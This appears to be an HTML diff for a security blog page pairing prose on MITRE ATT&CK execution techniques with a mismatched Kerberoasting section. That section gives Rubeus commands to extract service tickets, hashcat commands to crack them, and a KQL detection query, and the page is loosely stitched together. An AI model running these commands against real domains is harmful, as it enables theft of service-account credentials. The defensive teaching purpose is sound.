@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cyber BiblioTech</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <link rel="stylesheet" href="styles.css">
+  <style>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    padding: 20px;
+}
+
+/* Tree container */
+.tree {
+    list-style: none;
+    padding-left: 20px;
+    position: relative;
+}
+
+/* Vertical line for tree */
+.tree::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    border-left: 1px solid #ccc;
+    height: 100%;
+}
+
+/* Tree items */
+.tree li {
+    position: relative;
+    padding-left: 20px;
+    margin: 5px 0;
+}
+
+/* Horizontal branch line */
+.tree li::before {
+    content: '';
+    position: absolute;
+    top: 12px;
+    left: 0;
+    width: 20px;
+    border-top: 1px solid #ccc;
+}
+
+/* Remove vertical line for last child */
+.tree li:last-child::before {
+    border-left: none;
+}
+
+/* Folder and file icons */
+.folder i {
+    color: #f4b400; /* Yellow for folders */
+    margin-right: 5px;
+}
+.file i {
+    color: #4285f4; /* Blue for files */
+    margin-right: 5px;
+}
+
+/* Style for <details> and <summary> */
+details {
+    cursor: pointer;
+}
+summary {
+    list-style: none;
+}
+summary::-webkit-details-marker {
+    display: none; /* Hide default arrow */
+}
+</style>
+</head>
+
+    
+  </style>
+</head>
+<body class="blog-layout">
+
+  <!-- Navbar -->
+  <header class="navbar">
+    <div class="navbar__brand">
+      <div class="helix-icon">HHW</div>
+      hackherway cybersecurity
+    </div>
+    <div class="navbar__search">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="color:var(--text-muted)"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
+      <input type="text" placeholder="Query...">
+      <kbd>/</kbd>
+    </div>
+    <nav class="navbar__links">
+      <a href="index.html">127.0.0.1</a>
+      <a href="#" class="active">Security Ramblings</a>
+      <a href="#">Whoami</a>
+      <a href="#">Contact</a>
+    </nav>
+  </header>
+
+ <!-- Hero -->
+      <section class="hero fade-up">
+        <div class="hero__bg"></div>
+        <div class="hero__grid-overlay"></div>
+        <div class="hero__content">
+          <div class="hero__tag">
+            <span class="pulse"></span>
+            BiblioTech
+          </div>
+          <h1 class="hero__title">
+            <span class="glitch" data-text="Helix">Cyber</span> <span class="pink">BiblioTech</span><br>
+          </h1>
+          <p class="hero__desc">
+            The Hackherway Cyber BiblioTech is a modern digital information hub that focuses on digital literacy and access to technology information. It serves as a security community's gateway to the digital world, providing eBooks, manuals, policy templates, security development best practices, and specialized technology training materials in a safe, and secure environment.
+          </p>
+          <div class="hero__actions">
+            <a href="blog-execution.html" class="btn btn--primary">Start Reading &#8594;</a>
+            <a href="#topics" class="btn btn--ghost">Browse Topics</a>
+          </div>
+        </div>
+      </section>
+
+
+  <div class="blog-container">
+    <!-- Main Article -->
+    <article class="blog-main">
+      <div class="blog-header">
+        <a href="index.html" class="blog-header__back">&#8592; Back to 127.0.0.1</a>
+        <h1 class="blog-header__title">Cyber BiblioTech</h1>
+        <div class="blog-header__tags">
+          <span class="blog-tag">MITRE ATT&CK Tactics</span>
+          <span class="blog-tag">Cyber Defense</span>
+          <span class="blog-tag">Tactics, Techniques, Procedures (TTPs)</span>
+          <span class="blog-tag">Blue Team</span>
+          <span class="blog-tag">Defensive Operations</span>
+        </div>
+      </div>
+
+      <div class="blog-content">
+    <h2>Expandable File Tree (Font Awesome)</h2>
+<ul class="tree">
+    <li class="folder">
+        <details open>
+            <summary><i class="fa-solid fa-folder"></i> Project 1</summary>
+            <ul class="tree">
+                <li class="file"><i class="fa-regular fa-file-code"></i> index.html</li>
+                <li class="file"><i class="fa-regular fa-file-code"></i> style.css</li>
+                <li class="file"><i class="fa-regular fa-file-code"></i> app.js</li>
+                <li class="file"><i class="fa-regular fa-file-image"></i> logo.png</li>
+                <li class="file"><i class="fa-regular fa-file-image"></i> background.jpg</li>
+                <li class="file"><i class="fa-regular fa-file-lines"></i> README.md</li>
+            </ul>
+        </details>
+    </li>
+    <li class="folder">
+        <details>
+            <summary><i class="fa-solid fa-folder"></i> Project 2</summary>
+            <ul class="tree">
+                <li class="file"><i class="fa-regular fa-file-code"></i> index.html</li>
+                <li class="file"><i class="fa-regular fa-file-code"></i> style.css</li>
+                <li class="file"><i class="fa-regular fa-file-code"></i> app.js</li>
+                <li class="file"><i class="fa-regular fa-file-image"></i> logo.png</li>
+                <li class="file"><i class="fa-regular fa-file-image"></i> background.jpg</li>
+                <li class="file"><i class="fa-regular fa-file-lines"></i> README.md</li>
+            </ul>
+        </details>
+    </li>
+</ul>
+    <h2 id="user-execution">User Execution</h2>
+<p>Many execution events rely on some level of user interaction. Adversaries frequently design lures that convince a victim to open a malicious document, click a link, or run a file. These actions trigger embedded macros, scripts, or exploits that execute code in the user’s context. The reliance on user execution introduces variability, so attackers invest heavily in social engineering to increase success rates. Once triggered, the execution chain may silently download additional payloads, modify system settings, or establish persistence mechanisms without further user awareness.</p>
+        <h2 id="exploitation-for-client-execution">Exploitation for Client Execution</h2>
+<p>Execution can also occur through direct exploitation of vulnerabilities in client-side applications such as web browsers, document viewers, or email clients. In this scenario, the user does not need to explicitly run code; simply viewing malicious content is sufficient. Attackers leverage memory corruption flaws, logic bugs, or sandbox escapes to execute arbitrary code within the context of the vulnerable application. This method is particularly effective because it bypasses user suspicion and often evades traditional security controls that rely on detecting explicit execution events.</p>
+        <h2 id="inter-process-communications-abuse">Inter-Process-Communications Abuse</h2>
+<p>Adversaries frequently exploit legitimate inter-process communication (IPC) mechanisms to execute code indirectly. Instead of launching a new process in a suspicious way, they inject commands or payloads into existing processes. Techniques such as Dynamic Data Exchange (DDE), named pipes, or COM objects allow attackers to leverage trusted processes as execution proxies. This approach reduces visibility because the activity appears to originate from legitimate system components rather than a clearly malicious binary.</p>
+        <h2 id="job-execution">Scheduled Task and Job Execution</h2>
+<p>Execution may be deferred or automated through scheduled tasks, cron jobs, or other job scheduling mechanisms. While often associated with persistence, these techniques also serve as initial execution vectors. For example, an attacker may create a scheduled task that runs a payload at system startup or at a specific time. This allows execution to occur outside the initial compromise window, complicating forensic timelines and making detection more difficult.</p>
+        <h2 id="servic-execution">Service Execution</h2>
+<p>Services provide another reliable method for executing code, particularly in environments where administrative privileges have been obtained. Attackers can create or modify system services to run malicious binaries under the guise of legitimate system operations. Because services often run with elevated privileges and are expected to execute continuously, they offer a stable and stealthy execution mechanism. This technique is especially common in post-exploitation phases where maintaining control and stability is critical.</p>
+        <h2 id="api-and-system-call-invocation">API and System Call Invocation</h2>
+<p>Rather than relying solely on high-level scripting or command interpreters, sophisticated adversaries may execute code by directly invoking system APIs or low-level system calls. This allows them to bypass traditional monitoring mechanisms that focus on command-line activity. By embedding execution logic within compiled binaries or shellcode, attackers can interact directly with the operating system, making their actions harder to trace and attribute.</p>
+        <h2 id="fileless-and-in-memory-execution">Fileless and In-Memory Execution</h2>
+<p>Modern adversaries increasingly favor fileless execution techniques, where code runs entirely in memory without touching disk. This is often achieved through PowerShell, reflective DLL injection, or shellcode loaders. By avoiding disk artifacts, attackers reduce their forensic footprint and evade signature-based detection systems. In-memory execution is frequently combined with other techniques, such as process injection, to further obscure the origin and intent of the activity.</p>
+        <h2 id="living-off-the-land-techniques">Living-Off-The-Land (LOTL) Techniques</h2>
+<p>Execution often leverages legitimate system utilities, commonly referred to as “living-off-the-land binaries” (LOLBins). Tools such as PowerShell, <code>wmic</code>, <code>mshta</code>, or <code>rundll32</code> can be repurposed to execute malicious code while appearing benign. This approach minimizes the need for custom malware and exploits the trust placed in native system tools. As a result, distinguishing malicious execution from legitimate administrative activity becomes significantly more challenging.</p>
+        <h2 id="execution-chain-orchestration">Execution Chain Orchestration</h2>
+<p>Execution rarely occurs as a single isolated event. Instead, it is part of a broader chain that may involve multiple stages, each responsible for a specific function. An initial script may download a second-stage payload, which then injects into a process, which in turn establishes persistence and communication with command-and-control infrastructure. This layered approach allows adversaries to adapt dynamically, replace components as needed, and maintain resilience against partial detection or disruption.</p>
+        <h2 id="defensive-considerations">Defensive Considerations and Detection Challenges</h2>
+<p>From a defensive perspective, the execution phase is one of the most critical points for detection and response; however, it is also one of the most challenging to monitor effectively. The widespread use of legitimate tools, in-memory techniques, and indirect execution paths creates significant noise and ambiguity. Effective detection requires a combination of behavioral analysis, command-line auditing, process monitoring, and anomaly detection. Defenders must focus not only on what is executed, but how, when, and in what context, correlating execution events with preceding and subsequent activity to build a complete picture of adversary behavior.</p>
+        <div class="callout callout--info">
+          <span class="callout__icon">&#x2139;&#xFE0F;</span>
+          <div>Kerberoasting requires only a valid domain user account — no elevated privileges are needed to request service tickets, making it a low-barrier, high-impact attack.</div>
+        </div>
+
+
+
+
+        <h3>Extract Tickets with Rubeus</h3>
+        <p>Rubeus is a C# toolset for Kerberos interaction and abuse. It can request and extract service tickets in a crackable format:</p>
+        <div class="code-block">
+          <div class="code-block__header">
+            <div class="code-block__dots"><span></span><span></span><span></span></div>
+            <span class="code-block__lang">cmd</span>
+            <button class="code-block__copy">Copy</button>
+          </div>
+<pre><span class="c-comment"># Request tickets for all kerberoastable accounts</span>
+<span class="c-cmd">Rubeus.exe</span> <span class="c-flag">kerberoast</span> <span class="c-flag">/outfile:</span><span class="c-string">hashes.txt</span>
+
+<span class="c-comment"># Target a specific SPN</span>
+<span class="c-cmd">Rubeus.exe</span> <span class="c-flag">kerberoast</span> <span class="c-flag">/spn:</span><span class="c-string">MSSQLSvc/db01.corp.local:1433</span>
+
+<span class="c-comment"># Use RC4 downgrade for easier cracking (noisier)</span>
+<span class="c-cmd">Rubeus.exe</span> <span class="c-flag">kerberoast</span> <span class="c-flag">/tgtdeleg</span></pre>
+        </div>
+
+        <h3>Crack with Hashcat</h3>
+        <div class="code-block">
+          <div class="code-block__header">
+            <div class="code-block__dots"><span></span><span></span><span></span></div>
+            <span class="code-block__lang">bash</span>
+            <button class="code-block__copy">Copy</button>
+          </div>
+<pre><span class="c-comment"># Crack Kerberos 5 TGS-REP (RC4 - type 23)</span>
+<span class="c-cmd">hashcat</span> <span class="c-flag">-m 13100</span> hashes.txt <span class="c-string">wordlist.txt</span> <span class="c-flag">-r rules/best64.rule</span>
+
+<span class="c-comment"># Crack AES256 tickets (type 17/18 — slower)</span>
+<span class="c-cmd">hashcat</span> <span class="c-flag">-m 19700</span> hashes.txt <span class="c-string">wordlist.txt</span> <span class="c-flag">--force</span>
+
+<span class="c-comment"># Check results</span>
+<span class="c-cmd">hashcat</span> <span class="c-flag">-m 13100</span> hashes.txt <span class="c-flag">--show</span>
+<span class="c-output">$krb5tgs$23$*svc_sql$CORP.LOCAL*$...:Summer2024!</span></pre>
+        </div>
+
+        <div class="callout callout--danger">
+          <span class="callout__icon">&#x26A0;&#xFE0F;</span>
+          <div><strong>Legal Notice:</strong> Only perform Kerberoasting attacks against systems you are authorized to test. Unauthorized access to computer systems is a criminal offense under laws such as the CFAA (US) and Computer Misuse Act (UK).</div>
+        </div>
+
+        <h2 id="detection">Detection &amp; Defense</h2>
+        <p>Defending against Kerberoasting requires a multi-layered approach combining preventive controls and detection mechanisms:</p>
+
+        <h3>Preventive Controls</h3>
+        <ul>
+          <li><strong>Strong service account passwords:</strong> Use 25+ character randomly generated passwords for all service accounts with SPNs</li>
+          <li><strong>Group Managed Service Accounts (gMSA):</strong> Automatically rotate 240-character complex passwords every 30 days</li>
+          <li><strong>AES encryption only:</strong> Disable RC4_HMAC_MD5 via GPO to force AES256, making cracking computationally expensive</li>
+          <li><strong>Minimize SPNs:</strong> Audit and remove unnecessary SPNs from user accounts; use computer accounts where possible</li>
+          <li><strong>Privileged Access Management:</strong> Avoid assigning Domain Admin or high-privilege group memberships to service accounts</li>
+        </ul>
+        <div class="code-block">
+          <div class="code-block__header">
+            <div class="code-block__dots"><span></span><span></span><span></span></div>
+            <span class="code-block__lang">KQL (Microsoft Sentinel)</span>
+            <button class="code-block__copy">Copy</button>
+          </div>
+<pre><span class="c-comment">// Detect potential Kerberoasting via RC4 TGS requests</span>
+<span class="c-cmd">SecurityEvent</span>
+| <span class="c-keyword">where</span> EventID == <span class="c-string">4769</span>
+| <span class="c-keyword">where</span> TicketEncryptionType == <span class="c-string">"0x17"</span>   <span class="c-comment">// RC4</span>
+| <span class="c-keyword">where</span> ServiceName !endswith <span class="c-string">"$"</span>         <span class="c-comment">// Exclude machine accounts</span>
+| <span class="c-keyword">summarize</span> Count=<span class="c-cmd">count</span>() <span class="c-keyword">by</span> TargetUserName, IpAddress, <span class="c-cmd">bin</span>(TimeGenerated, <span class="c-string">5m</span>)
+| <span class="c-keyword">where</span> Count > <span class="c-string">5</span></pre>
+        </div>
+
+    </article>
+
+    <!-- Right TOC -->
+    <aside class="toc-sidebar">
+      <nav class="toc">
+        <div class="toc__title">On this page</div>
+        <a href="#overview" class="active">Overview</a>
+        <a href="#how-it-works">How Kerberoasting Works</a>
+        <a href="#prerequisites">Prerequisites</a>
+        <a href="#attack-steps">Step-by-Step Attack</a>
+        <a href="#detection">Detection &amp; Defense</a>
+        <a href="#tools">Tools Used</a>
+        <a href="#references">References</a>
+      </nav>
+    </aside>
+  </div>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="footer__inner">
+    <center>
+    <img src="https://pixelsafari.neocities.org/dividers/rainbowstars4.gif" alt="">
+    <img src="https://pixelsafari.neocities.org/dividers/rainbowstars4.gif" alt="">
+    </center>
+    <div class="footer__left">&copy;© 1996–2026 <strong>hackherway cybersecurity</strong>. Educational content only · No warranties implied</div>
+    <p class="footer-text">Built with curiosity, caffeine, and controlled paranoia</p>
+    <div class="footer__links">
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+    <a href="#">GitHub</a>
+    <a href="#">Contact</a>
+    <center>   · · ·
+    <div class="footer__center">&copy;· Stay Safe · Stay Vigilant · Stay Informed · Educational content only · No warranties implied ·</div>
+    <p>made with ❤️ by nullbrat • mindhackdiva</p>
+    <p> · s08 🩷 a02 · b10 💙 j25 · k08 💚 d14 · </p>
+    <center><img src="https://pixelsafari.neocities.org/dividers/rainbowstars4.gif" alt="">
+    <img src="https://pixelsafari.neocities.org/dividers/rainbowstars4.gif" alt="">
+    </center>
+    </div>
+    </div>
+    </footer>
+
+
+  <script src="script.js"></script>
+</body>
+</html>
